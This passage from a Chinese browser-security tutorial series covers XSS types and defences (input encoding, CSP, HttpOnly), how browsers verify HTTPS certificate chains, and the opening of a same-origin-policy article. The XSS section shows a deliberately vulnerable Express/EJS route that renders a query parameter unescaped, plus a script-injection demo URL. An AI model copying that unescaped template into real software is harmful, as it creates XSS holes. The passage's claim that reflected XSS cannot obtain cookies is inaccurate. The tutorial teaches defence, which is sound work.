alt=\"黑客利用Cookie信息登录用户账户\"></p>\n<p>以上就是存储型 XSS 攻击的一个典型案例，这是乌云网在 2015 年曝出来的，虽然乌云网由于某些原因被关停了，但是你依然可以通过这个站点来查看乌云网的一些备份信息。</p>\n<h3 id=\"2-反射型XSS攻击\"><a href=\"#2-反射型XSS攻击\" class=\"headerlink\" title=\"2. 反射型XSS攻击\"></a>2. 反射型 XSS 攻击</h3><p>在一个反射型 XSS 攻击过程中，恶意 JavaScript 脚本属于用户发送给网站请求中的一部分，随后网站又把恶意 JavaScript 脚本返回给用户。当恶意 JavaScript 脚本在用户页面中被执行时，黑客就可以利用该脚本做一些恶意操作。</p>\n<p>这样讲有点抽象，下面我们结合一个简单的 Node 服务程序来看看什么是反射型 XSS。首先我们使用 Node 来搭建一个简单的页面环境，搭建好的服务代码如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">'express'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> router = express.<span class=\"title class_\">Router</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* GET home page. */</span></span><br><span class=\"line\">router.<span class=\"title function_\">get</span>(<span class=\"string\">'/'</span>, <span class=\"keyword\">function</span>(<span class=\"params\">req, res, next</span>) {</span><br><span class=\"line\">  res.<span class=\"title function_\">render</span>(<span class=\"string\">'index'</span>, { <span class=\"attr\">title</span>: <span class=\"string\">'Express'</span>,<span class=\"attr\">xss</span>:req.<span class=\"property\">query</span>.<span class=\"property\">xss</span> });</span><br><span class=\"line\">});</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">module</span>.<span class=\"property\">exports</span> = router;</span><br></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">&lt;!<span class=\"variable constant_\">DOCTYPE</span> html&gt;</span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>&lt;%= title %&gt;<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">  <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">'stylesheet'</span> <span class=\"attr\">href</span>=<span class=\"string\">'/stylesheets/style.css'</span> /&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">  <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>&lt;%= title %&gt;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">  <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>Welcome to &lt;%= title %&gt;<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">      &lt;%- xss %&gt;</span></span><br><span class=\"line\"><span class=\"language-xml\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>上面这两段代码，第一段是路由，第二段是视图，作用是将 URL 中 xss 参数的内容显示在页面。我们可以在本地演示下，比如打开 <code>http://localhost:3000/?xss=123</code> 这个链接，这样在页面中展示就是 “123” 了（如下图），是正常的，没有问题的。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663e28780ea9cb1403413268.png\" alt=\"正常打开页面\"></p>\n<p>但当打开 <code>http://localhost:3000/?xss=&lt;script&gt;alert('你被xss攻击了')&lt;/script&gt;</code> 这段 URL 时，其结果如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663e28b40ea9cb140341bb63.png\" alt=\"反射型XSS攻击\"></p>\n<p>通过这个操作，我们会发现用户将一段含有恶意代码的请求提交给 Web 服务器，Web 服务器接收到请求时，又将恶意代码反射给了浏览器端，这就是反射型 XSS 攻击。在现实生活中，黑客经常会通过 QQ 群或者邮件等渠道诱导用户去点击这些恶意链接，所以对于一些链接我们一定要慎之又慎。</p>\n<p>另外需要注意的是，Web 服务器不会存储反射型 XSS 攻击的恶意代码，所以攻击者无法利用反射型 XSS 攻击来获取用户的 Cookie 信息。</p>\n<h3 id=\"3-基于DOM的XSS攻击\"><a href=\"#3-基于DOM的XSS攻击\" class=\"headerlink\" title=\"3. 基于DOM的XSS攻击\"></a>3. 基于 DOM 的 XSS 攻击</h3><p>基于 DOM 的 XSS 攻击是不牵连到页面 Web 服务器的。具体来说，黑客通过各种手段将恶意脚本注入到用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据。</p>\n<h2 id=\"如何阻止XSS攻击\"><a href=\"#如何阻止XSS攻击\" class=\"headerlink\" title=\"如何阻止XSS攻击\"></a>如何阻止 XSS 攻击</h2><p>我们知道存储型 XSS 攻击和反射型 XSS 攻击都是需要经过 Web 服务器来处理的，因此可以认为这两种类型的漏洞是服务端的安全漏洞。而基于 DOM 的 XSS 攻击全部都是在浏览器端完成的，因此基于 DOM 的 XSS 攻击是属于前端的安全漏洞。</p>\n<p>但无论是何种类型的 XSS 攻击，它们都有一个共同点，那就是首先往浏览器中注入恶意脚本，然后再通过恶意脚本将用户信息发送至黑客部署的恶意服务器上。</p>\n<p>所以要阻止 XSS 攻击，我们可以通过阻止恶意 JavaScript 脚本的注入和恶意消息的发送来实现。</p>\n<p>接下来我们就来看看一些常用的阻止 XSS 攻击的策略。</p>\n<h3 id=\"1-服务器对输入脚本进行过滤或转码\"><a href=\"#1-服务器对输入脚本进行过滤或转码\" class=\"headerlink\" title=\"1. 服务器对输入脚本进行过滤或转码\"></a>1. 服务器对输入脚本进行过滤或转码</h3><p>不管是反射型还是存储型 XSS 攻击，我们都可以在服务器端将一些关键的字符进行转码，比如最典型的：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">code</span>:<span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"title function_\">alert</span>(<span class=\"string\">'你被xss攻击了'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>这段代码过滤后，只留下了：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">code</span>:</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这样，当用户再次请求该页面时，由于 <code>&lt;script&gt;</code> 标签的内容都被过滤了，所以这段脚本在客户端是不可能被执行的。</p>\n<p>除了过滤之外，服务器还可以对这些内容进行转码，还是上面那段代码，经过转码之后，效果如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">code</span>:&amp;lt;script&amp;gt;<span class=\"title function_\">alert</span>(&amp;#<span class=\"number\">39</span>;你被xss攻击了&amp;#<span class=\"number\">39</span>;)&amp;lt;/script&amp;gt;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>经过转码之后的内容，如 <code>&lt;script&gt;</code> 标签被转换为 &lt;script&gt;，因此即使这段脚本返回给页面，页面也不会执行这段脚本。</p>\n<h3 id=\"2-充分利用CSP\"><a href=\"#2-充分利用CSP\" class=\"headerlink\" title=\"2. 充分利用CSP\"></a>2. 充分利用 CSP</h3><p>虽然在服务器端执行过滤或者转码可以阻止 XSS 攻击的发生，但完全依靠服务器端依然是不够的，我们还需要把 CSP 等策略充分地利用起来，以降低 XSS 攻击带来的风险和后果。</p>\n<p>实施严格的 CSP 可以有效地防范 XSS 攻击，具体来讲 CSP 有如下几个功能：</p>\n<ul>\n<li>限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；</li>\n<li>禁止向第三方域提交数据，这样用户数据也不会外泄；</li>\n<li>禁止执行内联脚本和未授权的脚本；</li>\n<li>还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。<br>因此，利用好 CSP 能够有效降低 XSS 攻击的概率。</li>\n</ul>\n<p>内容安全策略（Content Security Policy，CSP）是一个额外的安全层，用于帮助检测和减轻某些类型的攻击，如跨站脚本（XSS）和数据注入攻击。CSP 通过制定有效的源列表来控制页面可以加载的资源类型。以下是如何实现 CSP 的一些步骤：</p>\n<h4 id=\"定义策略\"><a href=\"#定义策略\" class=\"headerlink\" title=\"定义策略\"></a>定义策略</h4><p>首先，你需要定义一个 CSP 策略，明确指出哪些内容源是可信的。例如，你可能只允许从当前域名加载脚本。</p>\n<h4 id=\"设置-HTTP-响应头\"><a href=\"#设置-HTTP-响应头\" class=\"headerlink\" title=\"设置 HTTP 响应头\"></a>设置 HTTP 响应头</h4><p>CSP 通过 HTTP 响应头 <code>Content-Security-Policy</code> 实施。在你的服务器配置中添加这个头部，或者通过应用代码动态设置。</p>\n<figure class=\"highlight http\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Security-Policy</span><span class=\"punctuation\">: </span>script-src 'self'; img-src https://*; child-src 'none';</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这个例子中，<code>script-src</code> 仅允许来自当前域名的脚本执行，<code>img-src</code> 允许加载任何 HTTPS 图片，而 <code>child-src</code> 禁止所有的 iframe 内容加载。</p>\n<h4 id=\"使用-CSP-指令\"><a href=\"#使用-CSP-指令\" class=\"headerlink\" title=\"使用 CSP 指令\"></a>使用 CSP 指令</h4><p>CSP 提供了一系列指令，用于定义不同资源类型的加载策略：</p>\n<ul>\n<li><code>default-src</code>: 默认的资源源，其他指令未提及的资源类型将使用此指令。</li>\n<li><code>script-src</code>: 用于定义允许执行的 JavaScript 源。</li>\n<li><code>style-src</code>: 用于定义允许加载的样式表源。</li>\n<li><code>img-src</code>: 用于定义允许加载的图片源。</li>\n<li><code>font-src</code>: 用于定义允许加载的字体源。</li>\n<li><code>connect-src</code>: 用于限制通过 XHR 或 WebSocket 连接的源。</li>\n<li><code>frame-src</code>: 用于定义允许嵌入的源（用于 iframe）。</li>\n</ul>\n<h4 id=\"禁止内联脚本和未授权脚本\"><a href=\"#禁止内联脚本和未授权脚本\" class=\"headerlink\" title=\"禁止内联脚本和未授权脚本\"></a>禁止内联脚本和未授权脚本</h4><p>要禁止内联脚本（如 <code>onclick</code> 等 HTML 属性内的脚本）和未授权的脚本，可以设置：</p>\n<figure class=\"highlight http\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Security-Policy</span><span class=\"punctuation\">: </span>script-src 'self'; object-src 'none'; frame-ancestors 'none';</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这里，<code>object-src 'none'</code> 禁止了所有插件的加载，而 <code>frame-ancestors 'none'</code> 防止了当前页面被嵌入到其他页面的 iframe 中。</p>\n<h4 id=\"实现上报机制\"><a href=\"#实现上报机制\" class=\"headerlink\" title=\"实现上报机制\"></a>实现上报机制</h4><p>CSP 2.0 引入了 <code>report-uri</code> 指令，允许你指定服务器应该将违规报告发送到的 URI：</p>\n<figure class=\"highlight http\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Security-Policy</span><span class=\"punctuation\">: </span>default-src 'self'; report-uri /csp-report</span><br></pre></td></tr></tbody></table></figure>\n\n<p>服务器将 CSP 违规报告 POST 到指定的 URI，你可以在这里收集和分析这些报告。</p>\n<h4 id=\"测试你的策略\"><a href=\"#测试你的策略\" class=\"headerlink\" title=\"测试你的策略\"></a>测试你的策略</h4><p>在实施 CSP 之前，使用 <code>Content-Security-Policy-Report-Only</code> 响应头来测试你的策略，这样不会阻止违规加载，但会生成报告：</p>\n<figure class=\"highlight http\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Security-Policy-Report-Only</span><span class=\"punctuation\">: </span>script-src 'self'; report-uri /csp-report</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"调整和部署\"><a href=\"#调整和部署\" class=\"headerlink\" title=\"调整和部署\"></a>调整和部署</h4><p>根据收到的报告调整你的策略，确保它既严格又实用。一旦满意，就可以将 <code>Report-Only</code> 版本切换为实际的 <code>Content-Security-Policy</code>。</p>\n<h4 id=\"注意：\"><a href=\"#注意：\" class=\"headerlink\" title=\"注意：\"></a>注意：</h4><ul>\n<li>CSP 是一种防御机制，不能替代其他安全措施，如输入验证和输出编码。</li>\n<li>过度限制的 CSP 可能会影响网站的正常功能，因此需要仔细规划和测试。</li>\n<li>浏览器对 CSP 的支持非常好，但并非所有浏览器都支持所有 CSP 指令。</li>\n</ul>\n<p>通过实施 CSP，你可以减少 XSS 和其他注入攻击的风险，提高网站的安全性。</p>\n<h3 id=\"3-使用HttpOnly属性\"><a href=\"#3-使用HttpOnly属性\" class=\"headerlink\" title=\"3. 使用HttpOnly属性\"></a>3. 使用 HttpOnly 属性</h3><p>由于很多 XSS 攻击都是来盗用 Cookie 的，因此还可以通过使用 HttpOnly 属性来保护我们 Cookie 的安全。</p>\n<p>通常服务器可以将某些 Cookie 设置为 HttpOnly 标志，HttpOnly 是服务器通过 HTTP 响应头来设置的，下面是打开 Google 时，HTTP 响应头中的一段：</p>\n<figure class=\"highlight http\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">set-cookie</span><span class=\"punctuation\">: </span>NID=189=M8q2FtWbsR8RlcldPVt7qkrqR38LmFY9jUxkKo3-4Bi6Qu_ocNOat7nkYZUTzolHjFnwBw0izgsATSI7TZyiiiaV94qGh-BzEYsNVa7TZmjAYTxYTOM9L_-0CN9ipL6cXi8l6-z41asXtm2uEwcOC5oh9djkffOMhWqQrlnCtOI; expires=Sat, 18-Apr-2020 06:52:22 GMT; path=/; domain=.google.com; HttpOnly</span><br></pre></td></tr></tbody></table></figure>\n\n<p>我们可以看到，set-cookie 属性值最后使用了 HttpOnly 来标记该 Cookie。顾名思义，使用 HttpOnly 标记的 Cookie 只能使用在 HTTP 请求过程中，所以无法通过 JavaScript 来读取这段 Cookie。我们还可以通过 Chrome 开发者工具来查看哪些 Cookie 被标记了 HttpOnly，如下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663e2a2b0ea9cb1403455885.png\" alt=\"HttpOnly演示\"></p>\n<p>从图中可以看出，NID 这个 Cookie 的 HttpOlny 属性是被勾选上的，所以 NID 的内容是无法通过 <code>document.cookie</code> 是来读取的。</p>\n<p>由于 JavaScript 无法读取设置了 HttpOnly 的 Cookie 数据，所以即使页面被注入了恶意 JavaScript 脚本，也是无法获取到设置了 HttpOnly 的数据。因此一些比较重要的数据我们建议设置 HttpOnly 标志。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天我们就介绍到这里，下面我来总结下本文的主要内容。</p>\n<p>XSS 攻击就是黑客往页面中注入恶意脚本，然后将页面的一些重要数据上传到恶意服务器。常见的三种 XSS 攻击模式是存储型 XSS 攻击、反射型 XSS 攻击和基于 DOM 的 XSS 攻击。</p>\n<p>这三种攻击方式的共同点是都需要往用户的页面中注入恶意脚本，然后再通过恶意脚本将用户数据上传到黑客的恶意服务器上。而三者的不同点在于注入的方式不一样，有通过服务器漏洞来进行注入的，还有在客户端直接注入的。</p>\n<p>针对这些 XSS 攻击，主要有三种防范策略，第一种是通过服务器对输入的内容进行过滤或者转码，第二种是充分利用好 CSP，第三种是使用 HttpOnly 来保护重要的 Cookie 信息。</p>\n<p>当然除了以上策略之外，我们还可以通过添加验证码防止脚本冒充用户提交危险操作。而对于一些不受信任的输入，还可以限制其输入长度，这样可以增大 XSS 攻击的难度。</p>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>今天留给你的思考题是：你认为前端开发者对 XSS 攻击应该负多大责任？</p>\n<p>XSS 攻击是 Web 应用中常见的安全漏洞，它允许攻击者通过恶意的脚本来窃取用户数据、执行恶意操作等。前端开发者应该负大责任，因为前端开发者是 Web 应用中重要的一环，他们需要确保前端代码的安全性，防止 XSS 攻击。</p>\n"},{"title":"HTTPS: 浏览器如何验证数字证书？","url":"/browser/security/HTTPSCA.html","content":"<p>在《<a href=\"/browser/security/HTTPS.html\">HTTPS：让数据传输更安全</a>》这篇文章中，我们聊了下面几个问题：</p>\n<p>● HTTPS 使用了对称和非对称的混合加密方式，这解决了数据传输安全的问题；<br>● HTTPS 引入了中间机构 CA，CA 通过给服务器颁发数字证书，解决了浏览器对服务器的信任问题；<br>● 服务器向 CA 机构申请证书的流程；<br>● 浏览器验证服务器数字证书的流程。</p>\n<p>不过由于篇幅限制，关于 “<strong>浏览器如何验证数字证书</strong>” 的这个问题我们并没有展开介绍。那么今天我们就继续聊一聊这个问题。了解了这个问题，可以方便我们把完整的 HTTPS 流程给串起来，无论对于我们理解 HTTPS 的底层技术还是理解业务都是非常有帮助的。</p>\n<p>因为本文是<a href=\"/browser/security/HTTPS.html\">上一篇</a>的延伸，所以在分析之前，我们还是有必要回顾下数字证书申请流程和浏览器验证证书的流程，同时你最好也能回顾下。</p>\n<h2 id=\"数字证书申请流程\"><a href=\"#数字证书申请流程\" class=\"headerlink\" title=\"数字证书申请流程\"></a>数字证书申请流程</h2><p>我们先来回顾下数字证书的申请流程，比如极客时间向一个 CA 机构申请数字证书，流程是什么样的呢？</p>\n<p>首先极客时间填写了一张含有<strong>自己身份信息</strong>的表单，身份信息包括了自己公钥、站点资料、公司资料等信息，然后将其提交给了 CA 机构；CA 机构会审核表单中内容的真实性；审核通过后，CA 机构会拿出自己的私钥，对表单的内容进行一连串操作，包括了对明文资料进行 Hash 计算得出信息摘要， 利用 CA 的私钥加密信息摘要得出数字签名，最后将数字签名也写在表单上，并将其返还给极客时间，这样就完成了一次数字证书的申请操作。</p>\n<p>大致流程你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664356b60ea9cb1403e4c92b.png\" alt=\"数字证书申请过程\"></p>\n<h2 id=\"浏览器验证证书的流程\"><a href=\"#浏览器验证证书的流程\" class=\"headerlink\" title=\"浏览器验证证书的流程\"></a>浏览器验证证书的流程</h2><p>现在极客时间的官网有了 CA 机构签发的数字证书，那么接下来就可以将数字证书应用在 HTTPS 中了。</p>\n<p>我们知道，在浏览器和服务器建立 HTTPS 链接的过程中，浏览器首先会向服务器请求数字证书，之后浏览器要做的第一件事就是验证数字证书。那么，这里所说的 “验证”，它到底是在验证什么呢？</p>\n<p>具体地讲，浏览器需要<strong>验证证书的有效期</strong>、<strong>证书是否被 CA 吊销</strong>、<strong>证书是否是合法的 CA 机构颁发的</strong>。</p>\n<p>数字证书和身份证一样也是有时间期限的，所以第一部分就是<strong>验证证书的有效期</strong>，这部分比较简单，因为证书里面就含有证书的有效期，所以浏览器只需要判断当前时间是否在证书的有效期范围内即可。</p>\n<p>有时候有些数字证书被 CA 吊销了，吊销之后的证书是无法使用的，所以第二部分就是<strong>验证数字证书是否被吊销</strong>了。通常有两种方式，一种是下载吊销证书列表 - CRL (Certificate Revocation Lists)，第二种是在线验证方式 - OCSP (Online Certificate Status Protocol) ，它们各有优缺点，在这里我就不展开介绍了。</p>\n<p>最后，还要验证极客时间的数字证书是否是 CA 机构颁发的，验证的流程非常简单：</p>\n<p>● 首先，浏览器利用证书的原始信息计算出信息摘要；<br>● 然后，利用 <strong>CA 的公钥</strong>来解密数字证书中的<strong>数字签名</strong>，解密出来的数据也是信息摘要；<br>● 最后，判断这两个信息摘要是否相等就可以了。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6643573b0ea9cb1403e558d0.png\" alt=\"验证CA流程\"></p>\n<p>通过这种方式就验证了数字证书是否是由 CA 机构所签发的，不过这种方式又带来了一个新的疑问：<strong>浏览器是怎么获取到 CA 公钥的？</strong></p>\n<h2 id=\"浏览器是怎么获取到CA公钥的？\"><a href=\"#浏览器是怎么获取到CA公钥的？\" class=\"headerlink\" title=\"浏览器是怎么获取到CA公钥的？\"></a>浏览器是怎么获取到 CA 公钥的？</h2><p>通常，当你部署 HTTP 服务器的时候，除了部署当前的数字证书之外，还需要部署 CA 机构的数字证书，CA 机构的数字证书包括了 CA 的公钥，以及 CA 机构的一些基础信息。</p>\n<p>因此，极客时间服务器就有了两个数字证书:</p>\n<p>● 给极客时间域名的数字证书；<br>● 给极客时间签名的 CA 机构的数字证书。<br>然后在建立 HTTPS 链接时，服务器会将这两个证书一同发送给浏览器，于是浏览器就可以获取到 CA 的公钥了。</p>\n<p>如果有些服务器没有部署 CA 的数字证书，那么浏览器还可以通过网络去下载 CA 证书，不过这种方式多了一次证书下载操作，会拖慢首次打开页面的请求速度，一般不推荐使用。</p>\n<p>现在浏览器端就有了极客时间的证书和 CA 的证书，完整的验证流程就如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664357c00ea9cb1403e6ac93.png\" alt=\"CA证书\"></p>\n<p>我们有了 CA 的数字证书，也就可以获取得 CA 的公钥来验证极客时间数字证书的可靠性了。</p>\n<p>解决了获取 CA 公钥的问题，新的问题又来了，如果这个证书是一个恶意的 CA 机构颁发的怎么办？所以我们还需要<strong>浏览器证明这个 CA 机构是个合法的机构</strong>。</p>\n<h2 id=\"证明CA机构的合法性\"><a href=\"#证明CA机构的合法性\" class=\"headerlink\" title=\"证明CA机构的合法性\"></a>证明 CA 机构的合法性</h2><p>这里并没有一个非常好的方法来证明 CA 的合法性，妥协的方案是，直接在操作系统中内置这些 CA 机构的数字证书，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664358000ea9cb1403e779c6.png\" alt=\"操作系统内部内置CA数字证书\"></p>\n<p>我们将所有 CA 机构的数字证书都内置在操作系统中，这样当需要使用某 CA 机构的公钥时，我们只需要依据 CA 机构名称，就能查询到对应的数字证书了，然后再从数字证书中取出公钥。</p>\n<p>可以看到，这里有一个假设条件，浏览器默认信任操作系统内置的证书为合法证书，虽然这种方式不完美，但是却是最实用的一个。</p>\n<p>不过这种方式依然存在问题，因为在实际情况下，<strong>CA 机构众多，因此操作系统不可能将每家 CA 的数字证书都内置进操作系统。</strong></p>\n<h2 id=\"数字证书链\"><a href=\"#数字证书链\" class=\"headerlink\" title=\"数字证书链\"></a>数字证书链</h2><p>**<br>于是人们又想出来一个折中的方案，将颁发证书的机构划分为两种类型，根 CA (Root CAs) 和中间 CA (Intermediates CAs)**，通常申请者都是向中间 CA 去申请证书的，而根 CA 作用就是给中间 CA 做认证，一个根 CA 会认证很多中间的 CA，而这些中间 CA 又可以去认证其他的中间 CA。</p>\n<p>因此，每个根 CA 机构都维护了一个树状结构，一个根 CA 下面包含多个中间 CA，而中间 CA 又可以包含多个中间 CA。这样就形成了一个证书链，你可以沿着证书链从用户证书追溯到根证书。</p>\n<p>比如你可以在 Chrome 上打开极客时间的官网，然后点击地址栏前面的那把小锁，你就可以看到 *.geekbang.org 的证书是由中间 CA GeoTrust RSA CA2018 颁发的，而中间 CA GeoTrust RSA CA2018 又是由根 CA DigiCert Global Root CA 颁发的，所以这个证书链就是：*.geekbang.org—&gt;GeoTrust RSA CA2018–&gt;DigiCert Global Root CA。你可以参看下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664358330ea9cb1403e7b712.png\" alt=\"数字证书链\"></p>\n<p>因此浏览器验证极客时间的证书时，会先验证 *.geekbang.org 的证书，如果合法，再验证中间 CA 的证书，如果中间 CA 也是合法的，那么浏览器会继续验证这个中间 CA 的根证书。</p>\n<p>到了这里，依然存在一个问题，那就是<strong>浏览器怎么证明根证书是合法的？</strong></p>\n<p>如何验证根证书的合法性<br>其实浏览器的判断策略很简单，它只是简单地判断这个根证书在不在操作系统里面，如果在，那么浏览器就认为这个根证书是合法的，如果不在，那么就是非法的。</p>\n<p>如果某个机构想要成为根 CA，并让它的根证书内置到操作系统中，那么这个机构首先要通过 WebTrust 国际安全审计认证。</p>\n<h2 id=\"什么是WebTrust认证？\"><a href=\"#什么是WebTrust认证？\" class=\"headerlink\" title=\"什么是WebTrust认证？\"></a>什么是 WebTrust 认证？</h2><p>WebTrust 是由两大著名注册会计师协会 AICPA（美国注册会计师协会）和 CICA（加拿大注册会计师协会）共同制定的安全审计标准，主要对互联网服务商的系统及业务运作逻辑安全性、保密性等共计七项内容进行近乎严苛的审查和鉴证。 只有通过 WebTrust 国际安全审计认证，根证书才能预装到主流的操作系统，并成为一个可信的认证机构。</p>\n<p>目前通过 WebTrust 认证的根 CA 有 Comodo、geotrust、rapidssl、symantec、thawte、digicert 等。也就是说，这些根 CA 机构的根证书都内置在个大操作系统中，只要能从数字证书链往上追溯到这几个根证书，浏览器就会认为使用者的证书是合法的。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天的内容就介绍到这里，下面我们总结下本文的主要内容：</p>\n<p>我们先回顾了数字证书的申请流程，接着我们重点介绍了浏览器是如何验证数字证书的。</p>\n<p>首先浏览器需要 CA 的数字证书才能验证极客时间的数字证书，接下来我们需要验证 CA 证书的合法性，最简单的方法是将 CA 证书内置在操作系统中。</p>\n<p>不过 CA 机构非常多，内置每家的证书到操作系统中是不现实的，于是我们采用了一个折中的策略，将颁发证书的机构划分为两种类型，** 根 CA (Root CAs) 和中间 CA (Intermediates CAs)**，通常申请者都是向中间 CA 去申请证书的，而根 CA 作用就是给中间 CA 做认证，一个根 CA 会认证很多中间的 CA，而这些中间 CA 又可以去认证其他的中间 CA。</p>\n<p>于是又引出了数字证书链，浏览器先利用中间 CA 的数字证书来验证用户证书，再利用根证书来验证中间 CA 证书的合法性，最后，浏览器会默认相信内置在系统中的根证书。不过要想在操作系统内部内置根证书却并不容易，这需要通过 WebTrust 认证，这个认证审核非常严格。</p>\n<p>通过分析这个流程可以发现，浏览器默认信任操作系统内置的根证书，这也会带来一个问题，如果黑客入侵了你的电脑，那么黑客就有可能往你系统中添加恶意根数字证书，那么当你访问黑客站点的时候，浏览器甚至有可能会提示该站点是安全的。</p>\n<p>因此，HTTPS 并非是绝对安全的，采用 HTTPS 只是加固了城墙的厚度，但是城墙依然有可能被突破。</p>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>复述一下浏览器是怎么验证数字证书的？</p>\n<ol>\n<li>浏览器会先进行网站生成的 CA 证书进行验证；</li>\n<li>如果验证通过，则在进行中间 CA 证书进行验证；</li>\n<li>如果中间 CA 证书验证通过，则进行根 CA 证书进行验证。</li>\n</ol>\n"},{"title":"同源策略：为什么 XMLHttpRequest 不能跨域请求资源？","url":"/browser/security/SameOriginPolicy.html","content":"<p>浏览器安全可以分为三大块 ——<strong>Web 页面安全、浏览器网络安全和浏览器系统安全</strong>，所以本模块我们就按照这个思路来做介绍。鉴于页面安全的重要性，我们会用三篇文章来介绍该部分的知识；网络安全和系统安全则分别用一篇来介绍。</p>\n<p>今天我们就先来分析页面中的安全策略，不过在开始之前，我们先来做个假设，如果页面中没有安全策略的话，Web 世界会是什么样子的呢？</p>\n<p>Web 世界会是开放的，任何资源都可以接入其中，我们的网站可以加载并执行别人网站的脚本文件、图片、音频 / 视频等资源，甚至可以下载其他站点的可执行文件。</p>\n<p>Web 世界是开放的，这很符合 Web 理念。但如果 Web 世界是绝对自由的，那么页面行为将没有任何限制，这会造成无序或者混沌的局面，出现很多不可控的问题。</p>\n<p>比如你打开了一个银行站点，然后又一不小心打开了一个恶意站点，如果没有安全措施，恶意站点就可以做很多事情：</p>\n<ul>\n<li>修改银行站点的 DOM、CSSOM 等信息；</li>\n<li>在银行站点内部插入 JavaScript 脚本；</li>\n<li>劫持用户登录的用户名和密码；</li>\n<li>读取银行站点的 Cookie、IndexDB 等数据；</li>\n<li>甚至还可以将这些信息上传至自己的服务器，这样就可以在你不知情的情况下伪造一些转账请求等信息。</li>\n</ul>\n<p>所以说，<strong>在没有安全保障的 Web 世界中，我们是没有隐私的，因此需要安全策略来保障我们的隐私和数据的安全</strong>。</p>\n<p>这就引出了页面中最基础、最核心的安全策略：<strong>同源策略（Same-origin policy）</strong>。</p>\n<h2 id=\"什么是同源策略\"><a href=\"#什么是同源策略\" class=\"headerlink\" title=\"什么是同源策略\"></a>什么是同源策略</h2><p>要了解什么是同源策略，我们得先来看看什么是同源</p>\n<p>同源是指两个网页的协议、域名和端口号都相同，那么这两个网页就是同源的。比如下面这两个 URL，它们具有相同的协议 HTTPS、相同的域名 time.geekbang.org，以及相同的端口 443，所以我们就说这两个 URL 